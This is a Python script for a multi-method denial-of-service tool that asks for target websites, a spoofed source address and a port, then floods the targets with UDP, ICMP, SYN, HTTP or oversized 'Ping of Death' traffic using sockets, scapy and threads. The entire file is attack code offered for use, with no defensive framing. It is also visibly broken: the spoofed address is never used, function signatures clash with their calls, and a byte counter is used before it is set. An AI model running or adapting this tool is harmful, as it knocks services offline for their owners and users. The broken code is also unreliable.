import concurrent.futures as ThreadPoolExecutor
import time
import socket
import scapy.all as scapy
import requests
import progressbar

def start_attack():
    target_ips = get_target_ips()
    fake_ip = input("Enter The Spoofed IP Address: ")
    port = int(input("Enter The Port Number: "))
    num_packets = int(input("Enter Number of Packets to Send: "))
    burst_interval = float(input("Enter Burst Interval (in seconds): "))
    attack_type = input("Select Attack Type (UDP Flood, ICMP Echo, SYN Flood, HTTP Flood, Ping of Death): ")

    attack_function = get_attack_function(attack_type)

    attack_start_time = time.time()
    total_bytes_sent = 0

    with ThreadPoolExecutor.ThreadPoolExecutor() as executor:
        for target in target_ips:
            executor.submit(attack_function, target, port, num_packets, burst_interval)
            time.sleep(1)  # Check the flag every second

    print(f"Final attack speed: {get_attack_speed(attack_start_time, total_bytes_sent):.2f} GB/s")

def stop_attack():
    # Implement code to stop the attack
    pass

def get_website_names():
    targets = input("Enter Website Names or IP Addresses of The Targets (one per line): ").splitlines()
    return [target for target in targets if not target.replace(".", "").isdigit()]

def get_target_ips():
    website_names = get_website_names()
    target_ips = []
    for target in website_names:
        try:
            ip = socket.getaddrinfo(target, None)[0][4][0]
            target_ips.append(ip)
        except socket.gaierror:
            print(f"Invalid target: {target}")
    return target_ips

def get_attack_function(attack_type):
    if attack_type == "UDP Flood":
        return udp_flood_attack
    elif attack_type == "ICMP Echo":
        return icmp_echo_attack
    elif attack_type == "SYN Flood":
        return syn_flood_attack
    elif attack_type == "HTTP Flood":
        return http_flood_attack
    elif attack_type == "Ping of Death":
        return ping_of_death_attack
    else:
        print("Invalid attack type selected.")
        return None

def udp_flood_attack(target_ip, port, num_packets, burst_interval):
    try:
        sock = socket.socket(socket.AF_INET6 if ":" in target_ip else socket.AF_INET, socket.SOCK_DGRAM)
        with progressbar.ProgressBar(max_value=num_packets) as bar:
            for i in range(num_packets):
                sock.sendto(b"", (target_ip, port))
                packet_size = len(b"")  # Replace b"" with the actual packet data
                time.sleep(burst_interval)
                bar.update(i + 1)
                total_bytes_sent += packet_size
                # Calculate bits/second and display
                bits_per_second = (total_bytes_sent * 8) / (burst_interval * (i + 1))
                print(f"Bits/second: {bits_per_second:.2f}")
        sock.close()
    except Exception as e:
        print("An error occurred during the UDP flood attack:", e)

def icmp_echo_attack(target_ips, num_packets, burst_interval):
    try:
        for target in target_ips:
            with progressbar.ProgressBar(max_value=num_packets) as bar:
                for i in range(num_packets):
                    scapy.send(scapy.IP(dst=target) / scapy.ICMP())
                    print(f"Sent ICMP echo request to {target} ({i+1}/{num_packets})")
                    time.sleep(burst_interval)
                    bar.update(i + 1)
    except Exception as e:
        print("An error occurred during the ICMP echo attack:", e)

def syn_flood_attack(target_ips, port, num_packets, burst_interval):
    try:
        for target in target_ips:
            with progressbar.ProgressBar(max_value=num_packets) as bar:
                for i in range(num_packets):
                    scapy.send(scapy.IP(dst=target) / scapy.TCP(dport=port, flags="S"))
                    packet_size = len(scapy.IP(dst=target) / scapy.TCP(dport=port, flags="S"))
                    time.sleep(burst_interval)
                    bar.update(i + 1)
            port = (port + 1) % 65535  # Move this line outside the inner loop
    except Exception as e:
        print("An error occurred during the SYN flood attack:", e)

def http_flood_attack(target_ips, port, num_packets, burst_interval):
    try:
        urls = [f"http://{target}:{port}/" for target in target_ips]
        headers = {
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }

        with progressbar.ProgressBar(max_value=num_packets) as bar:
            for url in urls:
                for i in range(num_packets):
                    requests.get(url, headers=headers)
                    print(f"Sent HTTP request to {url} ({i+1}/{num_packets})")
                    time.sleep(burst_interval)
                    bar.update(i + 1)
    except Exception as e:
        print("An error occurred during the HTTP flood attack:", e)

def ping_of_death_attack(target_ips, num_packets, burst_interval):
    try:
        for target in target_ips:
            with progressbar.ProgressBar(max_value=num_packets) as bar:
                for i in range(num_packets):
                    scapy.send(scapy.IP(dst=target) / scapy.ICMP() / ("X" * 60000))
                    time.sleep(burst_interval)
                    bar.update(i + 1)
    except Exception as e:
        print("An error occurred during the Ping of Death attack:", e)

def get_attack_speed(attack_start_time, total_bytes_sent):
    attack_duration = time.time() - attack_start_time
    attack_speed = total_bytes_sent / (attack_duration * 1024 * 1024 * 1024)
    return attack_speed

if __name__ == "__main__":
    start_attack()

    # Print the complete edited code
    with open(__file__, 'r') as file:
        code = file.read()

    print(code)
